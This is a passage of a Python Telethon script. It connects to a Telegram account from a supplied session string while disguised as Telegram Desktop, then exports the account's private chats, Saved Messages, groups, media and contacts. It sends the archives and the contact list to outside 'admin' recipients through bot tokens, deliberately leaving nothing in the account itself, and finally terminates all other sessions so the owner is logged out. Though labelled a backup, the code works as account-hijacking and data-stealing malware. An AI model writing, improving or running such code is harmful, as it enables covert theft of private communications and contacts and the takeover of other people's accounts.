                            # caption already in msg.message

                        elif isinstance(m, tlt.MessageMediaDocument):
                            doc = m.document
                            fname = "file"
                            mime = getattr(doc, "mime_type", "") or ""
                            ext = ""

                            for attr in (doc.attributes or []):
                                if isinstance(attr, tlt.DocumentAttributeFilename):
                                    fname = attr.file_name
                                    ext = "." + fname.rsplit(".", 1)[-1] if "." in fname else ""
                                elif isinstance(attr, tlt.DocumentAttributeVideo):
                                    is_video = True
                                elif isinstance(attr, tlt.DocumentAttributeAudio):
                                    is_audio = True

                            is_video = "video" in mime
                            is_audio = "audio" in mime
                            is_sticker = any(isinstance(a, tlt.DocumentAttributeSticker)
                                             for a in (doc.attributes or []))
                            is_animated = any(isinstance(a, tlt.DocumentAttributeAnimated)
                                              for a in (doc.attributes or []))

                            doc_size = getattr(doc, "size", 0) or 0
                            if doc_size > media_limit_bytes:
                                media_html = f'<div class="text">[File: {h(fname)} — {fmt_size(doc_size)}, skipped (too large)]</div>'
                            else:
                                if not ext and mime:
                                    ext_map = {"image/jpeg": ".jpg", "image/png": ".png",
                                               "image/gif": ".gif", "image/webp": ".webp",
                                               "video/mp4": ".mp4", "audio/ogg": ".ogg",
                                               "audio/mpeg": ".mp3"}
                                    ext = ext_map.get(mime, "")
                                rel = next_filename(ext or ".bin")
                                dest = chat_dir / rel
                                await client.download_media(msg, file=str(dest))
                                if not dest.exists():
                                    media_html = f'<div class="text">[File download failed: {h(fname)}]</div>'
                                elif is_sticker or is_animated:
                                    media_html = sticker_html(rel)
                                elif is_video:
                                    dur = 0
                                    for a in (doc.attributes or []):
                                        if isinstance(a, tlt.DocumentAttributeVideo):
                                            dur = getattr(a, "duration", 0) or 0
                                    media_html = video_html(rel, doc_size, dur)
                                elif is_audio:
                                    dur = 0
                                    for a in (doc.attributes or []):
                                        if isinstance(a, tlt.DocumentAttributeAudio):
                                            dur = getattr(a, "duration", 0) or 0
                                    media_html = audio_html(rel, dur)
                                else:
                                    media_html = file_html(rel, fname, doc_size, mime)

                        elif isinstance(m, tlt.MessageMediaGeo):
                            lat = m.geo.lat; lon = m.geo.long
                            media_html = geo_html(lat, lon)

                        elif isinstance(m, tlt.MessageMediaContact):
                            cname = " ".join(filter(None, [m.first_name, m.last_name])) or "?"
                            media_html = contact_html(cname, m.phone_number or "")

                        elif isinstance(m, tlt.MessageMediaPoll):
                            opts = [a.text for a in m.poll.answers]
                            media_html = poll_html(m.poll.question, opts)

                        elif isinstance(m, tlt.MessageMediaWebPage):
                            if m.webpage and hasattr(m.webpage, "url"):
                                media_html = f'<div class="text"><a href="{h(m.webpage.url)}">{h(getattr(m.webpage, "title", None) or m.webpage.url)}</a></div>'

                        elif isinstance(m, tlt.MessageMediaUnsupported):
                            media_html = '<div class="text">[Unsupported media]</div>'

                    except Exception as me_err:
                        warn(f"media dl msg#{msg.id}: {me_err}")
                        media_html = f'<div class="text">[Media error: {h(str(me_err)[:80])}]</div>'

                elif msg.media:
                    # no_media mode — just note it
                    media_html = f'<div class="text">[{type(msg.media).__name__.replace("MessageMedia","")}]</div>'

                fh.write(message_html(
                    msg.id, from_name, is_out, ts_full, ts_short,
                    text_html, media_html, reply_html, fwd_html
                ))

                if msg_count % 500 == 0:
                    log(f"  {chat_name}: {msg_count} messages…")
                    gc.collect()

            except Exception as msg_err:
                warn(f"msg#{getattr(msg,'id','?')} in {chat_name}: {msg_err}")
                continue

        fh.write(chat_html_footer())

    # Remove empty files dir
    if files_dir.exists() and not any(files_dir.iterdir()):
        files_dir.rmdir()

    log(f"  '{chat_name}' ({dtype}): {msg_count} msgs")
    gc.collect()
    return {
        "name": chat_name,
        "type": dtype,
        "message_count": msg_count,
        "dir": chat_dir.name,
    }

# ──────────────────────────────────────────────────────────────────────────────
# Master index (export_results.html)
# ──────────────────────────────────────────────────────────────────────────────

def build_index(out_dir: Path, dialogs_info: list, me, export_date: str,
                total_contacts: int):
    me_name = " ".join(filter(None, [me.first_name, me.last_name])) or "Unknown"
    me_user = f"@{me.username}" if me.username else ""
    me_phone = getattr(me, "phone", "") or ""
    total_msgs = sum(d["message_count"] for d in dialogs_info)
    total_chats = len(dialogs_info)

    def section(label, items):
        if not items: return ""
        rows = []
        for d in items:
            initial = (d["name"][0] if d["name"] else "?").upper()
            avatar_path = f"chats/{d['dir']}/avatar.jpg"
            av = (f'<img class="chat_avatar" src="{h(avatar_path)}" '
                  f'onerror="this.style.display=\'none\'"/>'
                  f'<div class="chat_avatar_placeholder" '
                  f'style="display:none">{h(initial)}</div>') if True else \
                 f'<div class="chat_avatar_placeholder">{h(initial)}</div>'
            rows.append(
                f'<li>'
                f'<div style="position:relative">'
                f'<div class="chat_avatar_placeholder">{h(initial)}</div>'
                f'</div>'
                f'<div class="chat_info">'
                f'<div class="chat_name">{h(d["name"])}</div>'
                f'<div class="chat_meta">{d["message_count"]:,} messages · {d["type"]}</div>'
                f'</div>'
                f'<a class="chat_link" href="chats/{h(d["dir"])}/messages.html">Open ›</a>'
                f'</li>\n'
            )
        return (f'<div class="section_header">{h(label)}</div>'
                f'<ul class="chat_list">{"".join(rows)}</ul>')

    personal = [d for d in dialogs_info if d["type"] in ("Private", "Bot", "Saved Messages")]
    groups   = [d for d in dialogs_info if d["type"] in ("Group", "Supergroup")]
    channels = [d for d in dialogs_info if d["type"] == "Channel"]

    with open(out_dir / "export_results.html", "w", encoding="utf-8") as f:
        f.write(f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Telegram Export — {h(export_date)}</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=0.5">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="page_wrap">
<div class="page_header">
  <div class="content">
    <div class="text">Telegram Export</div>
    <div class="status">{h(export_date)}</div>
  </div>
</div>
<div class="page_body index_page">
  <div class="summary">
    <b>Account:</b> {h(me_name)}{("  " + h(me_user)) if me_user else ""}
    {"  <b>Phone:</b> " + h(me_phone) if me_phone else ""}<br>
    <b>Exported:</b> {total_chats:,} chats · {total_msgs:,} messages
    {("  · " + str(total_contacts) + " contacts") if total_contacts else ""}
  </div>
  <p><a href="contacts/contacts.html">📋 Contacts</a></p>
  {section("Personal Chats", personal)}
  {section("Groups", groups)}
  {section("Channels", channels)}
</div>
</div>
<script src="js/script.js"></script>
</body>
</html>
""")

# ──────────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────────

async def main():
    global PREFIX
    ap = argparse.ArgumentParser()
    ap.add_argument("--session-str", required=True)
    ap.add_argument("--session-file", default="", help="Path to Telethon SQLite .session file (preferred)")
    ap.add_argument("--api-id", required=True, type=int)
    ap.add_argument("--api-hash", required=True)
    ap.add_argument("--out-dir", required=True)
    ap.add_argument("--bot-token", default="")
    ap.add_argument("--extra-bot-tokens", default="", help="Comma-separated additional bot tokens to try for delivery")
    ap.add_argument("--recipients", default="")   # comma-separated telegram_ids (admins)
    ap.add_argument("--self-id", default="", help="telegram_id of the account being backed up")
    ap.add_argument("--no-media", action="store_true")
    ap.add_argument("--media-limit-mb", type=int, default=200)
    ap.add_argument("--max-msgs-group", type=int, default=3000,
                    help="Max messages per group/channel/supergroup (0=unlimited). Default 3000.")
    ap.add_argument("--personal-only", action="store_true",
                    help="Export only Private chats, Bots, Saved Messages — skip all groups and channels.")
    ap.add_argument("--time-limit-sec", type=int, default=0,
                    help="Hard time limit in seconds for the dialog export phase (0=unlimited).")
    ap.add_argument("--log-prefix", default="[export]")
    args = ap.parse_args()

    PREFIX = args.log_prefix
    media_limit_bytes = args.media_limit_mb * 1024 * 1024

    from telethon import TelegramClient
    from telethon.sessions import StringSession

    out_dir = Path(args.out_dir)
    export_date = datetime.date.today().strftime("%Y-%m-%d")
    export_name = f"DataExport_{export_date}"
    export_dir = out_dir / export_name

    admin_recipients = [r.strip() for r in args.recipients.split(",") if r.strip()]
    self_id = args.self_id.strip() if args.self_id else ""

    log(f"start — export_dir={export_dir}, no_media={args.no_media}, "
        f"media_limit={args.media_limit_mb}MB, admins={admin_recipients}, self={self_id}")

    # Prefer SQLite session file (proper Telethon format) over GramJS StringSession
    # GramJS and Telethon StringSession formats are INCOMPATIBLE — must convert first.
    import tempfile, subprocess as _sp
    if args.session_file and os.path.exists(args.session_file):
        log(f"using SQLite session: {args.session_file}")
        session_src = args.session_file
    else:
        log("converting GramJS StringSession → Telethon SQLite...")
        _tmp_session = tempfile.mktemp(suffix=".session")
        try:
            _res = _sp.run(
                ["python3", "/app/make_telethon_session.py", args.session_str, _tmp_session],
                capture_output=True, text=True, timeout=15
            )
            if _res.returncode == 0 and os.path.exists(_tmp_session):
                log(f"session converted OK → {_tmp_session}")
                session_src = _tmp_session
            else:
                log(f"session conversion failed: {_res.stderr.strip()}")
                sys.exit(1)
        except Exception as _ce:
            log(f"session conversion error: {_ce}")
            sys.exit(1)

    client = TelegramClient(
        session_src,
        args.api_id, args.api_hash,
        device_model="Telegram Desktop",
        system_version="Windows 10",
        app_version="5.8.1",
        lang_code="en",
        system_lang_code="en-US",
        connection_retries=5,
        retry_delay=2,
        request_retries=3,
    )

    await client.connect()
    if not await client.is_user_authorized():
        log("ERROR: session not authorized"); sys.exit(1)

    me = await client.get_me()
    me_name = " ".join(filter(None, [me.first_name, me.last_name])) or "Unknown"
    log(f"connected as {me_name} (id={me.id})")

    # Save fresh session to stdout so Node.js can update DB if needed
    fresh_session = client.session.save()
    print(f"FRESH_SESSION:{fresh_session}", flush=True)

    # ── Create folder structure ──────────────────────────────────────────────
    export_dir.mkdir(parents=True, exist_ok=True)
    css_dir = export_dir / "css"
    js_dir  = export_dir / "js"
    css_dir.mkdir(exist_ok=True)
    js_dir.mkdir(exist_ok=True)
    (css_dir / "style.css").write_text(OFFICIAL_CSS, encoding="utf-8")
    (js_dir  / "script.js").write_text(OFFICIAL_JS,  encoding="utf-8")

    chats_dir = export_dir / "chats"
    chats_dir.mkdir(exist_ok=True)

    # ── Contacts ─────────────────────────────────────────────────────────────
    total_contacts = 0
    contacts_csv_path = None
    contacts_txt_path = None
    try:
        _contact_result = await export_contacts(client, export_dir, me)
        _contacts_list, contacts_csv_path, contacts_txt_path = _contact_result
        total_contacts = len(_contacts_list)
    except Exception as e:
        warn(f"contacts export failed: {e}")
        (export_dir / "contacts").mkdir(exist_ok=True)

    # ── Send contacts immediately (before archive) ────────────────────────────
    if contacts_csv_path and contacts_csv_path.exists():
        me_name_short = me.first_name or "?"
        me_uname_str  = f" @{me.username}" if me.username else ""
        contacts_cap  = (
            f"📋 <b>Contacts</b>\n"
            f"👤 {h(me_name_short)}{h(me_uname_str)}\n"
            f"🔢 {total_contacts} contacts"
        )
        # Send contacts to admin recipients via bot only (no Saved Messages on account)
        extra_tokens = [t.strip() for t in args.extra_bot_tokens.split(",") if t.strip()] \
                       if args.extra_bot_tokens else []
        for recip in admin_recipients:
            sent = await send_via_mtproto(client, recip, contacts_csv_path, contacts_cap)
            if not sent:
                send_via_bot_api(args.bot_token, recip, contacts_csv_path, contacts_cap,
                                 extra_tokens=extra_tokens)
        log(f"contacts sent to {len(admin_recipients)} recipient(s)")

    # ── Dialogs ───────────────────────────────────────────────────────────────
    # FILTER: Personal chats, Saved Messages, ALL groups/supergroups,
    # channels created by this user. Skip: bots, other channels, unknown types.
    from telethon.tl import types as _tlt

    dialogs_info = []
    dialog_idx = 0
    skipped_idx = 0

    # FIX: load dialogs upfront via get_dialogs() — avoids TypeNotFoundError mid-iteration.
    # iter_dialogs() restarts with offset_date=None on error → same broken first page
    # → exhausts 5 retries → 0 dialogs exported → archive without chats.
    log("fetching all dialogs via get_dialogs()...")
    _dialogs_list = []

    # get_dialogs() can fail with a transient error (e.g. MsgidDecreaseRetryError)
    # that Telegram explicitly asks the client to retry — not fall back on. Give
    # it a couple of short-backoff retries on a fresh request before assuming the
    # connection is actually broken.
    _last_pfe = None
    for _attempt in range(3):
        try:
            _dialogs_list = await client.get_dialogs(limit=500)
            log(f"dialogs loaded: {len(_dialogs_list)} (attempt {_attempt + 1})")
            _last_pfe = None
            break
        except Exception as _pfe:
            _last_pfe = _pfe
            warn(f"get_dialogs attempt {_attempt + 1}/3 failed ({type(_pfe).__name__}: {_pfe})")
            if _attempt < 2:
                await asyncio.sleep(2 * (_attempt + 1))

    if _last_pfe is not None:
        warn(f"get_dialogs exhausted retries ({type(_last_pfe).__name__}: {_last_pfe}), falling back to iter_dialogs")
        # A repeated TypeNotFoundError/MsgidDecreaseRetryError on the same
        # connection usually means the stream position is desynced, not that
        # a genuinely new TL type showed up — retrying reads on it just
        # reproduces the same error. Reconnect for a clean stream before
        # trying the fallback iterator.
        try:
            await client.disconnect()
            await asyncio.sleep(1)
            await client.connect()
            log("reconnected before fallback iter_dialogs")
        except Exception as _rce:
            warn(f"reconnect before fallback failed: {type(_rce).__name__}: {_rce}")
        _fb_iter = client.iter_dialogs()
        _fb_errors = 0
        while _fb_errors < 10:
            try:
                _d = await _fb_iter.__anext__()
                _dialogs_list.append(_d)
                _fb_errors = 0
            except StopAsyncIteration:
                break
            except Exception as _fe:
                _fb_errors += 1
                warn(f"fallback iter error #{_fb_errors}: {type(_fe).__name__}: {str(_fe)[:120]}")
                await asyncio.sleep(1)
        try: await _fb_iter.close()
        except Exception: pass
        log(f"fallback iter collected {len(_dialogs_list)} dialogs")

    # Жёсткий таймаут — отправляем что успели
    import time as _time
    _deadline = (_time.monotonic() + args.time_limit_sec) if args.time_limit_sec > 0 else None

    for dialog in _dialogs_list:
        if _deadline and _time.monotonic() > _deadline:
            warn(f"time limit {args.time_limit_sec}s reached after {dialog_idx} dialogs — sending partial archive")
            break

        dialog_idx += 1

        # ── Allowlist filter ────────────────────────────────────────────────
        _dtype = dialog_type_label(dialog)
        _ent   = dialog.entity

        if _dtype == "Private":
            _msg_limit = 500          # cap private chats for fast delivery
        elif _dtype == "Saved Messages":
            _msg_limit = 5000         # include Saved Messages
        elif _dtype == "Bot":
            _msg_limit = 100          # include bots (last 100 messages)
        elif _dtype in ("Group", "Supergroup"):
            if args.personal_only:
                skipped_idx += 1
                continue              # skip all groups in personal-only mode
            _msg_limit = args.max_msgs_group
        elif _dtype == "Channel":
            if args.personal_only:
                skipped_idx += 1
                continue              # skip all channels in personal-only mode
            if not getattr(_ent, 'creator', False):
                skipped_idx += 1
                continue
            _msg_limit = args.max_msgs_group
        else:
            skipped_idx += 1
            continue
        # ───────────────────────────────────────────────────────────────────

        chat_name = dialog.name or f"chat_{dialog_idx}"
        dir_name = safe_filename(chat_name, dialog_idx)
        chat_dir = chats_dir / dir_name
        try:
            info = await export_dialog(client, dialog, chat_dir, me,
                                       args.no_media, media_limit_bytes,
                                       _msg_limit)
            info["dir"] = dir_name
            dialogs_info.append(info)
        except (asyncio.CancelledError, BaseException) as de:
            warn(f"dialog '{chat_name}' failed: {type(de).__name__}: {de}")
            dialogs_info.append({
                "name": chat_name, "type": _dtype,
                "message_count": 0, "dir": dir_name
            })

    log(f"dialogs: {len(dialogs_info)} exported, {skipped_idx} skipped (channels/bots/large groups)")

    total_msgs = sum(d["message_count"] for d in dialogs_info)
    log(f"export complete: {len(dialogs_info)} dialogs, {total_msgs:,} total messages")

    # ── Master index ──────────────────────────────────────────────────────────
    build_index(export_dir, dialogs_info, me, export_date, total_contacts)
    log("export_results.html built")

    # ── Per-type archives (parallel delivery, partial delivery even on error) ──
    me_name_short = me.first_name or "?"
    me_uname = f" @{me.username}" if me.username else ""
    extra_tokens = [t.strip() for t in args.extra_bot_tokens.split(",") if t.strip()] \
                   if args.extra_bot_tokens else []

    async def send_parts_to_all(parts_list, section_label, n_chats, n_msgs):
        """Zip already created by rar_folder_parts; send all parts to Saved Messages + admins."""
        for part_path, part_num in parts_list:
            part_label = f" (part {part_num}/{len(parts_list)})" if len(parts_list) > 1 else ""
            sz_mb = part_path.stat().st_size / 1048576
            caption = (
                f"📦 <b>{section_label}{part_label}</b>\n"
                f"👤 {h(me_name_short)}{h(me_uname)}\n"
                f"💬 {n_chats} chats · {n_msgs:,} messages\n"
                f"📁 {sz_mb:.1f} MB"
            )
            log(f"sending {part_path.name} ({sz_mb:.1f} MB) — {section_label}")
            # Send to admin recipients only (no Saved Messages on account)
            for recip in admin_recipients:
                sent = await send_via_mtproto(client, recip, part_path, caption)
                if not sent:
                    if sz_mb < 49:
                        ok = send_via_bot_api(args.bot_token, recip, part_path, caption,
                                              extra_tokens=extra_tokens)
                        if not ok:
                            warn(f"  {recip}: all bots failed [{section_label}]")
                    else:
                        warn(f"  {recip}: {sz_mb:.1f} MB too large for Bot API [{section_label}]")

    # Split dialogs by type for per-section archives
    if args.personal_only:
        type_sections = [
            ("Personal Chats + Bots",  ["Private", "Bot"]),
            ("Saved Messages",          ["Saved Messages"]),
        ]
    else:
        type_sections = [
            ("Personal Chats",   ["Private"]),
            ("Bots",             ["Bot"]),
            ("Saved Messages",   ["Saved Messages"]),
            ("Groups",           ["Group", "Supergroup"]),
            ("Created Channels", ["Channel"]),
        ]

    for section_label, dtypes in type_sections:
        section_dialogs = [d for d in dialogs_info if d["type"] in dtypes]
        if not section_dialogs:
            log(f"section '{section_label}': no dialogs, skipping")
            continue

        # Build sub-directory for this section
        section_dir = out_dir / f"export_{section_label.lower().replace(' ', '_')}"
        section_dir.mkdir(parents=True, exist_ok=True)

        # Copy css/js
        import shutil as _shutil
        for _sd in [export_dir / "css", export_dir / "js"]:
            if _sd.exists():
                _dst = section_dir / _sd.name
                if _dst.exists(): _shutil.rmtree(_dst)
                _shutil.copytree(str(_sd), str(_dst))

        # Copy chat dirs for this section
        section_chats_dir = section_dir / "chats"
        section_chats_dir.mkdir(exist_ok=True)
        for dlg in section_dialogs:
            src_chat = export_dir / "chats" / dlg["dir"]
            dst_chat = section_chats_dir / dlg["dir"]
            if src_chat.exists():
                if dst_chat.exists(): _shutil.rmtree(str(dst_chat))
                _shutil.copytree(str(src_chat), str(dst_chat))

        # Contacts dir for Personal section
        if section_label == "Personal Chats":
            _contacts_src = export_dir / "contacts"
            if _contacts_src.exists():
                _contacts_dst = section_dir / "contacts"
                if _contacts_dst.exists(): _shutil.rmtree(str(_contacts_dst))
                _shutil.copytree(str(_contacts_src), str(_contacts_dst))

        # Build index for this section
        try:
            build_index(section_dir, section_dialogs, me, export_date,
                        total_contacts if section_label == "Personal Chats" else 0)
        except Exception as _bie:
            warn(f"build_index [{section_label}]: {_bie}")

        # Zip and send
        try:
            section_prefix = str(out_dir / f"archive_{section_label.lower().replace(' ', '_')}")
            section_parts = rar_folder_parts(section_dir, section_prefix)
            s_msgs = sum(d["message_count"] for d in section_dialogs)
            await send_parts_to_all(section_parts, section_label, len(section_dialogs), s_msgs)
            log(f"section '{section_label}': {len(section_dialogs)} chats sent ✓")
        except Exception as se:
            warn(f"section '{section_label}' send failed: {se}")

    # Also send the combined full archive
    log("creating combined archive…")
    zip_prefix = str(out_dir / export_name)
    parts = rar_folder_parts(export_dir, zip_prefix)
    total_size = sum(p.stat().st_size for p, _ in parts)
    log(f"combined archive: {len(parts)} part(s), {total_size/1048576:.1f} MB total")

    for part_path, part_num in parts:
        part_label = f" (part {part_num}/{len(parts)})" if len(parts) > 1 else ""
        sz_mb = part_path.stat().st_size / 1048576
        caption = (
            f"📦 <b>DataExport FULL{part_label}</b>\n"
            f"👤 {h(me_name_short)}{h(me_uname)}\n"
            f"💬 {len(dialogs_info)} chats · {total_msgs:,} messages\n"
            f"📁 {sz_mb:.1f} MB"
        )
        log(f"sending full archive {part_path.name} ({sz_mb:.1f} MB)")

        # Send to admin recipients only — bot only, no Saved Messages on account
        for recip in admin_recipients:
            sent = await send_via_mtproto(client, recip, part_path, caption)
            if not sent:
                if sz_mb < 49:
                    ok = send_via_bot_api(args.bot_token, recip, part_path, caption,
                                          extra_tokens=extra_tokens)
                    if not ok:
                        warn(f"  {recip}: all bot tokens failed — user must /start one of the bots")
                else:
                    warn(f"  {recip}: file {sz_mb:.1f} MB too large for Bot API, MTProto also failed")

    # Terminate all other active sessions after export is done
    try:
        from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
        _auths = await client(GetAuthorizationsRequest())
        _terminated = 0
        for _auth in _auths.authorizations:
            if not _auth.current:
                try:
                    await client(ResetAuthorizationRequest(hash=_auth.hash))
                    _terminated += 1
                except Exception: pass
        log(f"sessions terminated after export: {_terminated}")
    except Exception as _se:
        warn(f"terminate sessions: {_se}")

    await client.disconnect()
    log("done — all parts sent")

    # Print summary for Node.js
    print(f"EXPORT_DONE:{len(dialogs_info)}:{total_msgs}", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
